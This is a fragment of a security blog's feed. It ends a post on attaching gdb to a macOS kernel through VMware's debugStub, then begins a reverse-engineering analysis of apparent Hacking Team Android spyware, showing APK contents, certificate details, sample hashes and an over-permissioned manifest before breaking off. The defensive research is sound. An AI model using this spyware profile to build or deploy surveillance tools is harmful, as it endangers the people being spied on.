href="http://ho.ax/posts/2012/02/vmware-hardware-debugging/" target="_blank" rel="external">Snare’s post on the matter</a>.</p>
<p>Not only is this post simple to understand, it is essentially the exact setup I was using. Turns out that VMWare made it pretty easy for us, since they have a <code>debugStub</code> which can be enabled on any VM. Opening up the VM config file, for me it was in <code>~/VMs/OSX10_11_5.vmwarevm/OSX10_11_5.vmx</code> and adding the following lines at the bottom (while VM is not running).<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</div><div class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</div></pre></td></tr></table></figure></p>
<p>This seems like it will work great, except Apple no longer ships <code>gdb</code> nor does it ship any macros to assist debugging for <code>gdb</code> anymore. Luckily someone has done all the work for us, thanks OSXreverser! Pedro wrote a great article a few years back about compiling <code>gdb</code> which can be <a href="https://reverse.put.as/2013/03/20/how-to-compile-gdb-in-mountain-lion-updated/" target="_blank" rel="external">found on his blog</a>. After that, go snag the repo <a href="https://github.com/gdbinit/kgmacros" target="_blank" rel="external">gdbinit/kgmacros</a> which contains the older macros which /mostly/ work for newer kernels. If you didn’t already have the <code>.gdbinit</code> script from Pedro, you should also <a href="https://github.com/gdbinit/Gdbinit" target="_blank" rel="external">get and install that</a>. After getting all this preparation work done, fire the VM back up and prepare gdb before connection. Target the kernel the guest machine is using, add the symbols for it and then load the helper macros and connect to the guest.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">diff@rigby:[~/kext_work/] $ gdb /Library/Developer/KDKs/KDK_10.11.5_15F34.kdk/System/Library/Kernels/kernel</div><div class="line">GNU gdb 6.3.50-20050815 (Apple version gdb-1824 + reverse.put.as patches v0.4) (Sat Jan  4 20:24:02 UTC 2014)</div><div class="line">Copyright 2004 Free Software Foundation, Inc.</div><div class="line">GDB is free software, covered by the GNU General Public License, and you are</div><div class="line">welcome to change it and/or distribute copies of it under certain conditions.</div><div class="line">Type &quot;show copying&quot; to see the conditions.</div><div class="line">There is absolutely no warranty for GDB.  Type &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;x86_64-apple-darwin&quot;...</div><div class="line">gdb$</div><div class="line">gdb$</div><div class="line">gdb$ add-symbol-file /Library/Developer/KDKs/KDK_10.11.5_15F34.kdk/System/Library/Kernels/kernel.dSYM/</div><div class="line">Added dsym &quot;/Library/Developer/KDKs/KDK_10.11.5_15F34.kdk/System/Library/Kernels/kernel.dSYM/&quot; to &quot;/Library/Developer/KDKs/KDK_10.11.5_15F34.kdk/System/Library/Kernels/kernel.dSYM/Contents/Resources/DWARF/kernel&quot;.</div><div class="line">gdb$</div><div class="line">gdb$ source  ~/repo/kgmacros/kgmacros_mavericks</div><div class="line">Loading Kernel GDB Macros package.  Type &quot;help kgm&quot; for more info.</div><div class="line">/Users/diff/repo/kgmacros/kgmacros_mavericks:6745: Error in sourced command file:</div><div class="line">No symbol &quot;ctrace_stack_size&quot; in current context.</div><div class="line">gdb$ target remote localhost:8864</div><div class="line">[New thread 1]</div><div class="line">warning: Error 268435459 getting port names from mach_port_names</div><div class="line">[Switching to process 1 thread 0x0]</div><div class="line">0xffffff801f7a25b8 in ?? ()</div><div class="line">-----------------------------------------------------------------------------------------------------------------------[regs]</div><div class="line">  RAX: 0x0000000000000000  RBX: 0x000000000000FFFF  RBP: 0xFFFFFF8059AB3E10  RSP: 0xFFFFFF8059AB3DF0  o d i t s z a P c</div><div class="line">  RDI: 0xFFFFFF801FE2D120  RSI: 0x0000000000000002  RDX: 0x00000000000000BC  RCX: 0x000000000000FFFF  RIP: 0xFFFFFF801F7A25B8</div><div class="line">  R8 : 0x0000000000000001  R9 : 0xFFFFFF8021D4A5D0  R10: 0xFFFFFF8059B05000  R11: 0xFFFFFF8059B15000  R12: 0xFFFFFF801FE2D150</div><div class="line">  R13: 0x000000000000000A  R14: 0x0000000000000001  R15: 0x0000000000000000</div><div class="line">  CS: 0008  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 0010</div><div class="line">  -----------------------------------------------------------------------------------------------------------------------[code]</div><div class="line">  0xffffff801f7a25b8:  83 3d d9 d2 75 00 00          cmp    DWORD PTR [rip+0x75d2d9],0x0        # 0xffffff801feff898</div><div class="line">  0xffffff801f7a25bf:  0f 85 7b ff ff ff             jne    0xffffff801f7a2540</div><div class="line">  0xffffff801f7a25c5:  b8 01 00 00 00                mov    eax,0x1</div><div class="line">  0xffffff801f7a25ca:  f0 48 29 05 ce d2 75 00       lock sub QWORD PTR [rip+0x75d2ce],rax        # 0xffffff801feff8a0</div><div class="line">  0xffffff801f7a25d2:  48 83 c4 08                   add    rsp,0x8</div><div class="line">  0xffffff801f7a25d6:  5b                            pop    rbx</div><div class="line">  0xffffff801f7a25d7:  41 5e                         pop    r14</div><div class="line">  0xffffff801f7a25d9:  41 5f                         pop    r15</div><div class="line">  -----------------------------------------------------------------------------------------------------------------------------</div><div class="line">  Kernel is located in memory at 0xffffff801f600000 with uuid of 749F71AC-4136-320E-8416-570E59A180B4</div><div class="line">  Kernel slid 0x1f400000 in memory.</div><div class="line">  Current language:  auto; currently minimal</div><div class="line">gdb$</div></pre></td></tr></table></figure></p>
<p>Awesome! Now we have a fully functional MacOS guest and a host connected with a debugger. Haven’t had any issues with disconnects yet while using <code>gdb</code>. It also might be worth noting that many people have said you can also connect <code>lldb</code> to this debugStub using it’s <code>gdb-remote</code> command using the command <code>(lldb) gdb-remote localhost:8864</code>.</p>
<p>Afterthoughts - something very wrong might be lurking in my set up and may have been causing the udp issues with the kernel debugger,  especially since I can’t really find anyone else discussing this problem. I was also loaded on pain medication due to a motorcycle  accident, so it is extremely likely that I misread something or came up with my solutions in backwards ways. Regardless, this seems to have worked. Discussing this on twitter and slack with a few people, it seems like many others rely on the VMWare debugStub - though <a href="https://twitter.com/i0n1c" target="_blank" rel="external">@i0n1c</a> disagrees with me and said there must be something wrong with my setup. He is probably correct. If I end up solving the underlying issue, I will post the solution here. This blog was primarily just to serve as a culmination of all the random things I ended up trying to get this to work so I don’t have to go through the pain again. Hopefully someone else finds this useful!</p>
<p>Special thanks to <a href="https://twitter.com/tamakikusu" target="_blank" rel="external">@tamakikusu</a>, <a href="https://twitter.com/OngEmil" target="_blank" rel="external">@OngEmil</a> and all of <a href="https://twitter.com/RedNagaSec" target="_blank" rel="external">@RedNagaSec</a> for your assistance both in knowledge, editing and insults to keep the world humble.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/remote_kext_debugging/drinking.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;This gif perfectly describe me attempting to connect debuggers to a kext using all the “simple” instructions on the internet.&lt;/p&gt;
&lt;p&gt;Recently I had far too much time on my hands and a Kext binary which seemed to pique my interest. After spending a bit of time analyzing the binary in IDA Pro, I wanted to prove out some theories I had by debugging it. A while back I had set up MacOS to be running as a QEMU/KVM machine - though I no longer had access to the hardware that I set this up on. The purpose of the previous use case was to have lots of instances up (fuzzing) as opposed to in depth debugging, and I had never actually wondered about debugging the kernel. Anyhoo - I decided to revisit setting up a virtualized instance of MacOS and decided to go the VMWare Fusion route. I had a license on the computer I had in front of me, wanted to continually do snapshots, and just assumed it would be easy to get it working locally. Well, I was sort of right?&lt;br&gt;
    
    </summary>
    
    
      <category term="research" scheme="https://rednaga.io/tags/research/"/>
    
      <category term="kext" scheme="https://rednaga.io/tags/kext/"/>
    
      <category term="macos" scheme="https://rednaga.io/tags/macos/"/>
    
      <category term="lldb" scheme="https://rednaga.io/tags/lldb/"/>
    
      <category term="gdb" scheme="https://rednaga.io/tags/gdb/"/>
    
      <category term="vmware" scheme="https://rednaga.io/tags/vmware/"/>
    
      <category term="kernel" scheme="https://rednaga.io/tags/kernel/"/>
    
      <category term="reverse engineering" scheme="https://rednaga.io/tags/reverse-engineering/"/>
    
  </entry>
  
  <entry>
    <title>HackingTeam back for your Androids, now extra insecure!</title>
    <link href="https://rednaga.io/2016/11/14/hackingteam_back_for_your_androids/"/>
    <id>https://rednaga.io/2016/11/14/hackingteam_back_for_your_androids/</id>
    <published>2016-11-14T08:00:00.000Z</published>
    <updated>2017-10-29T00:34:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ul>
<li><a href="#Soapbox-Prelude">Soapbox Prelude</a></li>
<li><a href="#The-Story">The Story</a></li>
<li><a href="#Analysis">Analysis</a><ul>
<li><a href="#APK-Content">APK Content</a></li>
<li><a href="#Signer-Certificate">Signing Certificate</a></li>
<li><a href="#Android-Manifest">Android Manifest</a></li>
<li><a href="#String-Encryption">String Encryption</a></li>
<li><a href="#Decrypting-the-Strings">Decrypting the Strings</a></li>
</ul>
</li>
<li><a href="#Features-Overview">Features Overview</a><ul>
<li><a href="#Data-Exfiltration">Data Exfiltration</a></li>
</ul>
</li>
<li><a href="#Is-it-HackingTeam">Is it HackingTeam?</a></li>
<li><a href="#Conclusion">Conclusion</a></li>
<li><a href="#Appendix">Appendix</a><ul>
<li><a href="#Yara-Rule">Yara Rule</a></li>
<li><a href="#Samples">Samples</a></li>
<li><a href="#Captured-C2-Interactions">Captured C2 Interactions</a><ul>
<li><a href="#RequestActionsToExecute-Request">RequestActionsToExecute - Request</a></li>
<li><a href="#RequestActionsToExecute-Response">RequestActionsToExecute - Response</a></li>
<li><a href="#AckRequestedActions-Request">AckRequestedActions - Request</a></li>
<li><a href="#AckRequestedActions-Response">AckRequestedActions - Response</a></li>
<li><a href="#UploadService-Request">UploadService - Request (data exfiltration)</a></li>
<li><a href="#UploadService-Response">UploadService - Response</a></li>
<li><a href="#NotifyLog-Request">NotifyLog - Request</a></li>
<li><a href="#NotifyLog-Response">NotifyLog - Response</a></li>
<li><a href="#Decrypted-String-Dump">Decrypted String Dump</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Soapbox-Prelude"><a href="#Soapbox-Prelude" class="headerlink" title="Soapbox Prelude"></a><a name="Soapbox-Prelude"></a>Soapbox Prelude</h2><p>The past few years have been interesting in terms of surveillance and nation state purchased malware. Gamma Team (FinFisher) got owned, followed by Hacking Team having all the source code for their implants being posted on <a href="https://github.com/HackedTeam" target="_blank" rel="external">GitHub</a>. Just this year, Hacking Team <a href="https://www.privacyinternational.org/node/826" target="_blank" rel="external">lost their global license to sell spyware</a>. I’m unsure how this really would affect their business. The linked article explains the situation better than I ever could. To quote the article, it means:</p>
<blockquote>
<p>Hacking Team will have to apply for an individual [export] license for each country. It will then be up to the Italian authorities to approve or deny any requests.</p>
</blockquote>
<p>Maybe someone can shed light on what this actually means? Does that mean that a license must be acquired for the country in which the implant is being deployed or does it mean the license must exist for the country which the buying entity exists? Regardless, it would seem that recently the Hacking Team <a href="http://www.ilfattoquotidiano.it/2016/11/02/hacking-team-motivazione-inadeguata-il-consiglio-di-stato-contraddice-il-mise-sulla-revoca-dellautorizzazione-allexport/3163585/" target="_blank" rel="external">has had their global license reinstated</a>. So, in theory none of this matters… Or does it?<br><a id="more"></a></p>
<p>The export license Hacking Team requires aren’t easy to look up and victims of their implants aren’t coming forward publicly. Do they even know they’re infected? Do they just want to avoid publicly saying they got owned? It’s anyone’s guess.</p>
<p>In this post, we’ll describe what we believe to be active Hacking Team Android implants. We’ll also provide evidence that these implants were being actively developed such as the number of different versions and the incremental advances and changes between them. We hope that this analysis will be helpful to those who might come across it in the wild and that it’ll provide a starting point for the researcher community to piece together the full story of where these implants are being deployed or if Hacking Team’s export licenses are being abused.</p>
<p>Worst case scenario? This’ll be an interesting blog about some spyware that wasn’t too hard to reverse and it ends up being a bit more expensive to operate since all the AVs will detect it in a week or two.</p>
<p><strong>TL;DR</strong> Don’t sell spyware even if it’s “regulated”. If you do, make it more fun to reverse next time please. Enough soapboxing, let’s start this post!</p>
<p>-diff</p>
<h2 id="The-Story"><a href="#The-Story" class="headerlink" title="The Story"></a><a name="The-Story"></a>The Story</h2><p>Caleb and I were recently contacted by someone claiming to have an “advanced malware” sample which had been deployed against one of their coworkers. This type of claim comes up more than you would think. Usually it’s just a very paranoid person who doesn’t know how to use Occam’s razor and has a computer glitch or mysterious reboot and they assume someone must be attacking them. We were understandably skeptical of the claim, so we followed up with a barrage of questions. Interestingly, the more answers we got back, the more it seemed we were dealing with a legitimate threat. At first, our contact thought it was <a href="https://en.wikipedia.org/wiki/FinFisher" target="_blank" rel="external">FinFisher</a> because they had looked at this malware family in the past and they looked similar.</p>
<p>Unlike a paranoid delusion, this claim was backed up by actual files for us to analyze! While we cannot release these files due to an agreement with our contact and an ongoing criminal investigation, we <em>have</em> been able to find several similar files in the wild through other public feeds which closely resemble the sample we were provided. The functionality hardly changes between versions and the obfuscation is the same. Since these other samples are already publicly available, we feel comfortable talking about this threat. While I often bash companies for pushing PR and marketing content without sharing binaries, I feel that this is different. I can’t share the specific sample we were given but I do provide <em>nearly identical</em> samples and analysis of the techniques of the original sample. This will easily allow other researchers to reproduce the results, formulate their own blog posts, and most importantly, protect themselves and their customers. Also, since I don’t work for any anti-virus company, I’m not trying to push my product over anyone else’s right now! Hooray somewhat moral high ground! With all this in mind, the analysis is a little tailored since it was done twice. With this visible part on a new binary found in the wild and already available on VT. However, I’ll be taking the same approach I took on the original binary.</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a><a name="Analysis"></a>Analysis</h2><h3 id="APK-Content"><a href="#APK-Content" class="headerlink" title="APK Content"></a><a name="APK-Content"></a>APK Content</h3><p>First, let’s look at what’s inside the APK.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[98%]diff@rocksteady:[fresh] $ ls -l</div><div class="line">total 464</div><div class="line">-rw-r--r--@ 1 diff  staff   231K Nov  4 20:18 VODA.apk</div><div class="line">[98%]diff@rocksteady:[fresh] $ shasum VODA.apk</div><div class="line">03ea8043d16ecb9a462cc99d26b80889671e7621  VODA.apk</div><div class="line">[98%]diff@rocksteady:[fresh] $ unzip -e VODA.apk -d contents</div><div class="line">Archive:  VODA.apk</div><div class="line">  inflating: contents/AndroidManifest.xml</div><div class="line">  extracting: contents/resources.arsc</div><div class="line">  extracting: contents/res/drawable-hdpi/icon.png</div><div class="line">  extracting: contents/res/drawable-mdpi/icon.png</div><div class="line">  extracting: contents/res/drawable-xhdpi/icon.png</div><div class="line">  inflating: contents/classes.dex</div><div class="line">  inflating: contents/META-INF/MANIFEST.SF</div><div class="line">  inflating: contents/META-INF/CERT.MF</div><div class="line">  inflating: contents/META-INF/CERT.RSA</div></pre></td></tr></table></figure>
<p>Nothing sticking out here. No native binaries to dig into. No hidden packages. No large high-entropy files without an extension floating around. A very vanilla looking Android application.</p>
<h3 id="Signing-Certificate"><a href="#Signing-Certificate" class="headerlink" title="Signing Certificate"></a><a name="Signer-Certificate"></a>Signing Certificate</h3><p>Now, let’s get some information about the signing certificate.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[98%]diff@rocksteady:[fresh] $ keytool -printcert -file contents/META-INF/CERT.RSA</div><div class="line">Owner: CN=...</div><div class="line">Issuer: CN=...</div><div class="line">Serial number: 2367d93d</div><div class="line">Valid from: Thu Apr 24 07:36:53 PDT 2014 until: Mon Apr 18 07:36:53 PDT 2039</div><div class="line">Certificate fingerprints:</div><div class="line">	    MD5:  18:F6:4B:26:7E:48:48:B6:AD:DB:26:F7:0E:23:47:0E</div><div class="line"> 	    SHA1: 72:23:C2:41:E0:8D:74:66:AC:99:7D:57:A1:22:3E:97:F4:7B:8C:7D</div><div class="line">	    SHA256: B4:5A:4C:71:EC:3E:89:AC:93:7A:1F:66:BB:FC:04:3B:CC:A0:64:B8:60:CE:93:86:E8:02:B9:05:56:E3:BC:47</div><div class="line">	    Signature algorithm name: SHA256withRSA</div><div class="line">	    Version: 3</div><div class="line"></div><div class="line">Extensions:</div><div class="line"></div><div class="line">#1: ObjectId: 2.5.29.14 Criticality=false</div><div class="line">SubjectKeyIdentifier [</div><div class="line">KeyIdentifier [</div><div class="line">0000: D9 AC 12 E4 E0 ED 19 1B   E7 15 A3 6B 7D B1 03 B7  ...........k....</div><div class="line">0010: E6 5B DB 34                                        .[.4</div><div class="line">]</div><div class="line">]</div></pre></td></tr></table></figure>
<p>Nothing super interesting in the certificate except the common names (CN) are both <code>...</code> where as a legitimate developer would use their name or the company’s name or pretty much anything other than an ellipsis. Since every APK must be signed to be installed and most malware authors are lazy, they tend to use the same certificates between versions and even across malware families. You can search for other apps signed by the same certificate with <a href="https://analyst.koodous.com/apks?search=certificate:7223C241E08D7466AC997D57A1223E97F47B8C7D" target="_blank" rel="external">Koodous</a>.</p>
<p><img src="/images/hackingteam_back_for_your_androids/koodous_search_results.png" alt=""></p>
<p>These results show three other applications with the same certificate. This means these apps were likely created by the same person unless their private key was leaked. Sadly, none of them seem to have been analyzed much or voted on by anyone. If we look at the hashes of these files on VirusTotal, we also don’t see anyone talking about them and weak detection ratios which would indicate no one seems to know their significance.</p>
<ul>
<li><a href="https://www.virustotal.com/en/file/07278c56973d609caa5f9eb2393d9b1eb41964d24e7e9e7a7e7f9fdfb2bb4c31/analysis/" target="_blank" rel="external">07278c56973d609caa5f9eb2393d9b1eb41964d24e7e9e7a7e7f9fdfb2bb4c31</a> ( 7 / 54 )</li>
<li><a href="https://www.virustotal.com/en/file/ed33b83be3af715d3fd8ba6ac8b2b551a16697c5a37a9fcebfc40a024cc9b818/analysis/" target="_blank" rel="external">ed33b83be3af715d3fd8ba6ac8b2b551a16697c5a37a9fcebfc40a024cc9b818</a> ( 21 / 54 )</li>
<li><a href="https://www.virustotal.com/en/file/e362a037e70517565d28ab85959e6c9d231b2baf0c2df3b87dfaa1451278e80c/analysis/" target="_blank" rel="external">e362a037e70517565d28ab85959e6c9d231b2baf0c2df3b87dfaa1451278e80c</a> ( 4 / 55 )</li>
<li><a href="https://www.virustotal.com/en/file/87efe6a1cbf4d4481c6fa6e2c70a26a0b50a460557a1ad876af9966a571f8a4c/analysis/" target="_blank" rel="external">87efe6a1cbf4d4481c6fa6e2c70a26a0b50a460557a1ad876af9966a571f8a4c</a> ( 0 / 57)</li>
</ul>
<h3 id="Android-Manifest"><a href="#Android-Manifest" class="headerlink" title="Android Manifest"></a><a name="Android-Manifest"></a>Android Manifest</h3><p>When we dig into the Android Manifest, we see standard malware / spyware behavior: ask for absolutely <em>every permission</em>:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">android:versionCode</span>=<span class="string">"15"</span> <span class="attr">android:versionName</span>=<span class="string">"15"</span> <span class="attr">android:installLocation</span>=<span class="string">"1"</span> <span class="attr">package</span>=<span class="string">"it.phonevoda.androidv1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">"7"</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">"19"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">supports-screens</span> <span class="attr">android:anyDensity</span>=<span class="string">"true"</span> <span class="attr">android:smallScreens</span>=<span class="string">"true"</span> <span class="attr">android:normalScreens</span>=<span class="string">"true"</span> <span class="attr">android:largeScreens</span>=<span class="string">"true"</span> <span class="attr">android:resizeable</span>=<span class="string">"true"</span> <span class="attr">android:xlargeScreens</span>=<span class="string">"true"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.camera"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.camera.any"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.camera.autofocus"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.microphone"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.touchscreen"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.location"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.location.gps"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.location.network"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.telephony"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.telephony.cdma"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.telephony.gsm"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.wifi"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.nfc"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-feature</span> <span class="attr">android:name</span>=<span class="string">"android.hardware.bluetooth"</span> <span class="attr">android:required</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CHANGE_WIFI_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_WIFI_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CHANGE_NETWORK_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MODIFY_PHONE_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.UPDATE_DEVICE_STATS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECORD_AUDIO"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CAMERA"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_FINE_LOCATION"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_COARSE_LOCATION"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WAKE_LOCK"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CALL_LOG"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CONTACTS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PROFILE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CALENDAR"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_LOGS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span 